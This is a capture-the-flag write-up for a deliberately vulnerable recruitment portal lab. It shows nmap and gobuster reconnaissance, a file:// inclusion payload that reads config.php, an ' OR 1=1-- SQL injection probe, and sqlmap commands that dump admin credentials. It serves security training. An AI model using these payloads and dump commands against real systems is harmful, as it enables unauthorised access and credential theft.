# Recruit

Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker by mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?

### Objectives

* What is the flag value after logging in as a normal user?
* What is the flag value after logging in as the administrator?

---

## Reconnaissance

I started with a basic Nmap scan to identify the services running on the target.

**Command:**

```bash
nmap -sS 10.81.182.40
```

**Output:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 11:12 -0400
Nmap scan report for 10.81.182.40
Host is up (0.031s latency).
Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

The scan revealed three open ports: **22 (SSH)**, **53 (DNS)**, and **80 (HTTP)**. Visiting port 80 presented a login page, so the next step was to enumerate directories.

## Directory Enumeration

**Command:**

```bash
gobuster dir -w raft-medium-directories.txt -u http://10.81.182.40 -x html,php,txt,js
```

**Output:**

```text
assets               (Status: 301) [--> http://10.81.182.40/assets/]
mail                 (Status: 301) [--> http://10.81.182.40/mail/]
javascript           (Status: 301) [--> http://10.81.182.40/javascript/]
phpmyadmin           (Status: 301) [--> http://10.81.182.40/phpmyadmin/]
server-status        (Status: 403)
```

The **/mail** directory looked particularly interesting, so I decided to investigate it.

## Finding HR Credentials

The `/mail` directory contained the following email:

```text
Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

We’ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
```

This email provided the **HR username** (`hr`) and stated that the password was stored in `config.php`.

I attempted to browse directly to `config.php`, but the page was blank. Since PHP files are executed by the web server, this was expected. There had to be another way to retrieve its contents.

While exploring the application, I found an interesting note in the API documentation:

```text
You can fetch a candidate CV using the following endpoint:
/file.php?cv=<URL>
```

This suggested a potential **Local File Inclusion (LFI)** vulnerability using the `file://` wrapper. I tested the following URL:

```text
http://10.81.182.40/file.php?cv=file://config.php
```

The attack was successful, and the contents of `config.php` were returned, revealing the HR password:

```text
hr########d123
```

Using these credentials, I logged in as the HR user, gaining access to the dashboard and obtaining the **first flag**.

## Finding the Administrator Credentials

The next objective was to gain administrative access.

The dashboard didn't initially reveal anything particularly interesting apart from a search bar. I first tested several XSS payloads, but none were successful.

Next, I tested for SQL injection using the following payload:

```sql
' OR 1=1--
```

This produced the following error:

```text
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

Receiving a verbose SQL error strongly suggested that the search functionality was vulnerable to **SQL injection**.

## Exploiting SQL Injection with sqlmap

To automate the exploitation process, I used `sqlmap` against the search functionality.

**Command:**

```bash
sqlmap -u "http://10.81.182.40/dashboard.php?search" \
--cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" \
--forms --crawl=2 --dbs
```

The scan identified the available databases:

```text
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```

The `recruit_db` database looked promising, so I dumped its contents.

**Command:**

```bash
sqlmap -u "http://10.81.182.40/dashboard.php?search" \
--cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" \
--forms --crawl=2 \
-D recruit_db --dump-all
```

This returned the following credentials:

```text
Database: recruit_db
Table: users

+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | admi#####admin | admin    |
+----+----------------+----------+
```

The dump also revealed the `candidates` table:

```text
+----+---------------+--------------+--------------------+
| id | name          | status       | position           |
+----+---------------+--------------+--------------------+
| 1  | Alice Johnson | Approved     | Frontend Developer |
| 2  | Bob Smith     | Under Review | Backend Developer  |
| 3  | Charlie Brown | Rejected     | Security Analyst   |
| 4  | Diana Prince  | Selected     | HR Executive       |
+----+---------------+--------------+--------------------+
```

Using the extracted administrator credentials, I logged in as **admin** and successfully obtained the **final flag**.

## Summary

This challenge involved chaining multiple vulnerabilities together:

1. **Reconnaissance** with Nmap to identify exposed services.
2. **Directory enumeration** with Gobuster to discover hidden endpoints.
3. Information disclosure via the **mail** page, revealing the HR username and hinting that the password was stored in `config.php`.
4. Exploitation of a **Local File Inclusion (LFI)** vulnerability using the `file://` wrapper to retrieve `config.php` and obtain the HR credentials.
5. Authentication as the HR user to obtain the first flag.
6. Identification and exploitation of a **SQL injection** vulnerability in the search functionality.
7. Database extraction using `sqlmap` to recover the administrator credentials.
8. Authentication as the administrator to obtain the final flag.



